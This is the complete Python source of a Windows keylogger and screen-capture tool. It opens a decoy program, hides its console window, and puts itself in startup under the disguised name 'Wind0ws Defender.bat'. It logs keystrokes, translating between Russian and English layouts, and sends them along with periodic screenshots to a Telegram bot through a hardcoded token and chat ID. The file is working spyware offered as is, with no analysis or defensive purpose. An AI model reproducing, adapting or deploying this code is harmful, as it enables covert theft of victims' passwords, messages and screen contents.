
from pynput import keyboard 
from pynput.keyboard import Key, KeyCode, Listener
import time
import telebot
from threading import *
import ctypes
import os, sys, psutil
import pyautogui
import getpass

translationEnRu = str.maketrans(dict(zip("""qwertyuiopQWERTYUIOP[{]}asdfghjklASDFGHJKL;':"zxcvbnmZXCVBNM,./<>?@#$^&`~""","""йцукенгшщзЙЦУКЕНГШЩЗхХъЪфывапролдФЫВАПРОЛДжэЖЭячсмитьЯЧСМИТЬбю.БЮ,"№;:?ёЁ""")))
translationRuEn = str.maketrans(dict(zip("""йцукенгшщзЙЦУКЕНГШЩЗхХъЪфывапролдФЫВАПРОЛДжэЖЭячсмитьЯЧСМИТЬбю.БЮ,"№;:?ёЁ""","""qwertyuiopQWERTYUIOP[{]}asdfghjklASDFGHJKL;':"zxcvbnmZXCVBNM,./<>?@#$^&`~""")))
pid_file_path = 'SP/pypid.pid'
max_log = 100
screen_deley = 20
win_patch = (os.path.abspath(os.sep))
win_patch = win_patch[:2]
bot = telebot.TeleBot('5627738264:AAGdmIc3siyeKeTSjYOScNVHn2JJ68L-Kpg')
MyNums = ['302620163']
log = ''
final_patch = win_patch+"\Program Files\Antivirus"
final_patch2 = win_patch+"/Program Files/Antivirus"
USER_NAME = getpass.getuser()


def is_admin():
   try:
     return os.getuid() == 0
   except AttributeError:
     return ctypes.windll.shell32.IsUserAnAdmin() != 0

if is_admin() != True:
    while True:
        print('Ошибка','Запустите от имени администратора')
        time.sleep(10)

def start_fake():
    os.system("SP\Speccy64.exe")

t4 = Thread(target=start_fake, args=())
t4.start()

if os.path.exists( pid_file_path ):
	pid_file = open( pid_file_path, "r" )
	pid = int( pid_file.read() )
	pid_file.close()
	if psutil.pid_exists( pid ):
		print( 'уже запущен' )
		sys.exit()

pid_file = open( pid_file_path, "w" )
pid_file.write( str( os.getpid() ) )
pid_file.close()


def hide():     
    import win32console, win32gui
    window = win32console.GetConsoleWindow()                                                                                         
    win32gui.ShowWindow(window, 0)
    return True
hide()

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
        file_path +="\\"+os.path.basename(__file__)[:-2]+"exe"
    bat_path =win_patch+r'\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "Wind0ws Defender.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)
add_to_startup()

try:
    bot.send_message(MyNums[0],"KeyLogger Start")
except:
    pass

if not os.path.exists(final_patch):
    os.makedirs(final_patch2)

def screenshot():
    while True:

        myscreenshot= pyautogui.screenshot()
        myscreenshot.save(final_patch+"\screen.png")
        img = open('C:/Program Files/Antivirus/screen.png','rb')
        try:
            bot.send_photo(MyNums[0],img)
        except:
            pass
        time.sleep(screen_deley)

t3 = Thread(target=screenshot, args = ())
t3.start()

pressed_vks = set()

def get_vk(key):
    return key.vk if hasattr(key, 'vk') else key.value.vk

def is_combination_pressed(combination):
    return all([get_vk(key) in pressed_vks for key in combination])

def get_layout():
    u = ctypes.windll.LoadLibrary("user32.dll")
    pf = getattr(u, "GetKeyboardLayout")
    if hex(pf(0)) == '0x4190419':
        return 'ru'
    if hex(pf(0)) == '0x4090409':
        return 'en'

start_leng = get_layout()
now_leng = start_leng

def leng_swipe():
    global now_leng
    if now_leng=='ru':
        now_leng='en'
    else:
        now_leng='ru'

def Sender_tele(log):
    for i in MyNums:
        try:
            bot.send_message(i,log)
        except:
            pass
        
def process_key_pressss(key):
    global log
    global translationEnRu
    global translationRuEn
    vk = get_vk(key) 
    pressed_vks.add(vk)

    for combination in combination_to_function:  
        if is_combination_pressed(combination):  
            combination_to_function[combination]()

    Mykey = str(key)

    if len(Mykey)==3:
        Mykey = Mykey[1]
        if now_leng != start_leng and now_leng=='ru' and Mykey != 'Key.shift' and Mykey != 'Key.alt_l':
            Mykey = Mykey.translate(translationEnRu)
        elif now_leng != start_leng and now_leng=='en' and Mykey != 'Key.shift' and Mykey != 'Key.alt_l':
            Mykey = Mykey.translate(translationRuEn)
    if Mykey== 'Key.space':
        Mykey= ' '
    elif len(Mykey)!=1:
        Mykey = f'({Mykey[4:]})'
    log +=Mykey
    if len(log) >= max_log:
        t1 = Thread(target=Sender_tele, args = (log,))
        t1.start()
        log = ''

combination_to_function = {
    frozenset([Key.alt_l, Key.shift]): leng_swipe,
}

def on_release(key):
    try:
        vk = get_vk(key) 
        pressed_vks.remove(vk)  
    except:
        pass

keyboard_listener = keyboard.Listener(on_press=process_key_pressss, on_release=on_release)

with keyboard_listener:
    keyboard_listener.join()
bot.polling(none_stop=True)